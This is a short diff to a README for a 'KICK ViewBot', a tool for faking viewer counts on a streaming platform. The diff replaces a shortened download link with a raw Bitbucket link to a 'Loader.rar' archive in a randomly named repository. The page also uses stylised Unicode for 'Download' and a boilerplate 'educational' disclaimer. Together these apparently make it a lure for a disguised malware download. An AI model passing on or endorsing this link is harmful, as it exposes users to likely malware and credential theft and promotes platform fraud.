@@ -1,6 +1,6 @@
 # KICK ViewBot 🟢
 
-# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://shorturl.at/jmL12)
+# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://bitbucket.org/43g34g34g34/34g34g34g34g/raw/a3820b161d8e9b18a1074086f295714311de00b5/Loader.rar)
 
 ## ⚠️  DISCLAIMER
 ## This project was made for educational purposes and personal use. You hold responsibility, liability and accountability for any consequences caused by your actions.
